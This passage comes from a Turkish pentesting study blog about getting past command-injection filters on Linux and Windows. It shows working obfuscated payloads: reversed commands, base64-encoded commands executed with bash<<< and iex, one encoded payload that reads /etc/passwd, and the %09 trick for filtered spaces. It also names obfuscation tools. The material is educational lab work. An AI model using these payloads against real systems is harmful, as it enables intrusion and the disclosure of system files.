+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FHK@htb[/htb]$ <span class="built_in">echo</span> <span class="string">&#x27;whoami&#x27;</span> | rev</span><br><span class="line"></span><br><span class="line">imaohw</span><br></pre></td></tr></table></figure>
+
+<p>Şimdi tersine çevirdiğimiz komutu tekrar tersine çevirip çalıştıralım:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FHK0@htb[/htb]$ $(rev&lt;&lt;&lt;&#x27;imaohw&#x27;)</span><br><span class="line"></span><br><span class="line">FHK0</span><br></pre></td></tr></table></figure>
+
+<p>Burp üzerindeki kullanımına bir göz atalım:</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%2014.png" alt="Untitled"></p>
+<p>Windows üzerinde de kullanılabilir:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\htb&gt; &quot;whoami&quot;[-1..-20] -join &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">imaohw</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\htb&gt; iex &quot;$(&#x27;imaohw&#x27;[-1..-20] -join &#x27;&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">21y4d</span><br></pre></td></tr></table></figure>
+
+<h3 id="Encoded-Commands"><a href="#Encoded-Commands" class="headerlink" title="Encoded Commands"></a><strong><strong>Encoded Commands</strong></strong></h3><p>Komutların şifrelenip daha sonra işlem aşamasında şifresinin çözülmesidir. Örneğin bir satırı alıp base64’e göre şifreleyelim:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FHK@htb[/htb]$ <span class="built_in">echo</span> -n <span class="string">&#x27;cat /etc/passwd | grep 33&#x27;</span> | <span class="built_in">base64</span></span><br><span class="line"></span><br><span class="line">Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==</span><br></pre></td></tr></table></figure>
+
+<p>Sonrasında bunu çözümleyen ve bash’e atan kodumuzu yazalım:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FHK@htb[/htb]$ bash&lt;&lt;&lt;$(<span class="built_in">base64</span> -d&lt;&lt;&lt;<span class="string">Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span></span><br></pre></td></tr></table></figure>
+
+<p>Yukarıda da görüldüğü üzere başarıyla çözümlememizi yaptık. Burada dikkat edilmesi gereken pipe (<code>|</code>) işaretinin filtrelendiğini bildiğimiz için onun yerine <code>&lt;&lt;&lt;</code> kullanıyor oluşumuzdur. Şimdi burp üzerindeki kullanımını görelim:</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%2015.png" alt="Untitled"></p>
+<p>Bash veya base64 gibi bazı komutlar filtrelenmiş olsa bile, önceki bölümde tartıştığımız tekniklerle (örneğin karakter ekleme) bu filtreyi atlayabilir veya komut yürütme için <code>sh</code> ve b64 kod çözme için <code>openssl</code> veya <code>xxd</code> gibi diğer alternatifleri kullanabiliriz. </p>
+<p>Aynı teknik windows üzerinde de uygulanabilir:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; [<span class="type">Convert</span>]::ToBase64String([<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="string">&#x27;whoami&#x27;</span>))</span><br><span class="line"></span><br><span class="line">dwBoAG8AYQBtAGkA</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">iex</span> <span class="string">&quot;<span class="variable">$</span>([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#x27;dwBoAG8AYQBtAGkA&#x27;)))&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">21</span>y4d</span><br></pre></td></tr></table></figure>
+
+<p>Aynı benzer şifrelemeyi Linux üzerinde de gerçekleştirebiliriz ancak o zaman utf-8 ‘i utf-16 ‘ya çevirmek gerekir. Böyleyece yukarıdakiyle aynı base64 metnini elde ederiz:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FHK@htb[/htb]$ <span class="built_in">echo</span> -n <span class="built_in">whoami</span> | iconv -f utf-8 -t utf-16le | <span class="built_in">base64</span></span><br><span class="line"></span><br><span class="line">dwBoAG8AYQBtAGkA</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion">PayloadsAllTheThings&#x2F;Command Injection at master · swisskyrepo&#x2F;PayloadsAllTheThings</a></p>
+<hr>
+<p><strong>Ufak bir vaka çalışması:</strong></p>
+<p>Önce çalıştırmak istediğim komutu base64’e çevirdim:</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%2016.png" alt="Untitled"></p>
+<p>Sonrasında burp kullanırken tekrardan geri döndürdüm ve sonuç:</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%2017.png" alt="Untitled"></p>
+<div class="note info flat"><p>🌐 <strong>Not:</strong> Boşluklar filtrelendiği için onların yerlerine %09 kullanmayı unutma.</p>
+</div>
+
+<hr>
+<h2 id="Kullanabilecegin-Araclar"><a href="#Kullanabilecegin-Araclar" class="headerlink" title="Kullanabileceğin Araçlar"></a>Kullanabileceğin Araçlar</h2><p><strong>Linux:</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Bashfuscator/Bashfuscator">https://github.com/Bashfuscator/Bashfuscator</a></p>
+<p><strong>Windows:</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://fhk0.github.io">fhk0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://fhk0.github.io/2022/09/16/Command-Injections/">https://fhk0.github.io/2022/09/16/Command-Injections/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/commandinjection.jpg" data-sites="facebook, twitter, linkedin"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/09/16/File-Upload-Attacks/"><img class="prev-cover" src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/fileuploadattacks.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">File Upload Attacks</div></div></a></div><div class="next-post pull-right"><a href="/2022/09/16/SQL-Injection/"><img class="next-cover" src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/sqlinjection.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">SQL Injection</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mrrobot.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">fhk0</div><div class="author-info__description">Web Application Pentester</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/FHK0"><i class="fab fa-github"></i><span>Follow Me on GitHub</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://www.linkedin.com/in/firathilmikaplan/" target="_blank" title="Linkedin"><i class="fa-brands fa-linkedin"></i></a><a class="social-icon" href="https://medium.com/@fhk0" target="_blank" title="Medium"><i class="fa-brands fa-medium"></i></a><a class="social-icon" href="https://www.youtube.com/channel/UCik9LW_i9-h2NKVrs6180ng" target="_blank" title="YouTube"><i class="fa-brands fa-youtube"></i></a><a class="social-icon" href="https://www.hackerrank.com/fhk0x" target="_blank" title="HackerRank"><i class="fa-brands fa-hackerrank"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Hey! I'm currently solving PortSwigger Labs. I'll share the solutions of them soon.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tespit"><span class="toc-number">1.</span> <span class="toc-text">Tespit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Yahu-Kardesim-Ben-Yaziyorum-Komutu-Bu-Diyor-Ki-Benim-Tipime-Gore-Degilsin-E-Napicaz-O-Zaman"><span class="toc-number">1.0.1.</span> <span class="toc-text">Yahu Kardeşim Ben Yazıyorum Komutu Bu Diyor Ki Benim Tipime Göre Değilsin E Napıcaz O Zaman?</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Filtrelemeler-ve-Kara-Listeler"><span class="toc-number">2.</span> <span class="toc-text">Filtrelemeler ve Kara Listeler</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Character-Shifting"><span class="toc-number">2.0.1.</span> <span class="toc-text">Character Shifting</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypassing-Blacklisted-Commands"><span class="toc-number">2.1.</span> <span class="toc-text">Bypassing Blacklisted Commands</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Advanced-Command-Obfuscation"><span class="toc-number">2.2.</span> <span class="toc-text">Advanced Command Obfuscation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Case-Manipulation"><span class="toc-number">2.2.1.</span> <span class="toc-text">Case Manipulation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reversed-Commands"><span class="toc-number">2.2.2.</span> <span class="toc-text">Reversed Commands</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Encoded-Commands"><span class="toc-number">2.2.3.</span> <span class="toc-text">Encoded Commands</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kullanabilecegin-Araclar"><span class="toc-number">2.3.</span> <span class="toc-text">Kullanabileceğin Araçlar</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/File-Inclusion/" title="File Inclusion"><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/fileinclusion.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="File Inclusion"/></a><div class="content"><a class="title" href="/2022/09/16/File-Inclusion/" title="File Inclusion">File Inclusion</a><time datetime="2022-09-16T05:24:50.000Z" title="Created 2022-09-16 08:24:50">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/Web-Attacks/" title="Web Attacks"><img src="/img/content-images/htb-academy/Web%20Attacks%20219f9e2baec741e9a0cba7f5c82486d5/webattacks.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web Attacks"/></a><div class="content"><a class="title" href="/2022/09/16/Web-Attacks/" title="Web Attacks">Web Attacks</a><time datetime="2022-09-16T05:24:41.000Z" title="Created 2022-09-16 08:24:41">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/Broken-Authentication/" title="Broken Authentication"><img src="/img/content-images/htb-academy/Broken%20Authentication%2097c8a4f364d34faba8206ba43cd5143f/brokenauth.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Broken Authentication"/></a><div class="content"><a class="title" href="/2022/09/16/Broken-Authentication/" title="Broken Authentication">Broken Authentication</a><time datetime="2022-09-16T05:24:30.000Z" title="Created 2022-09-16 08:24:30">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/Login-Brute-Forcing/" title="Login Brute Forcing"><img src="/img/content-images/htb-academy/Login%20Brute%20Forcing%20e7d1108ee8b549c085496b59363951fd/loginbruteforcing.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Login Brute Forcing"/></a><div class="content"><a class="title" href="/2022/09/16/Login-Brute-Forcing/" title="Login Brute Forcing">Login Brute Forcing</a><time datetime="2022-09-16T05:24:17.000Z" title="Created 2022-09-16 08:24:17">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/File-Upload-Attacks/" title="File Upload Attacks"><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/fileuploadattacks.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="File Upload Attacks"/></a><div class="content"><a class="title" href="/2022/09/16/File-Upload-Attacks/" title="File Upload Attacks">File Upload Attacks</a><time datetime="2022-09-16T05:24:05.000Z" title="Created 2022-09-16 08:24:05">2022-09-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By fhk0</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,0" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
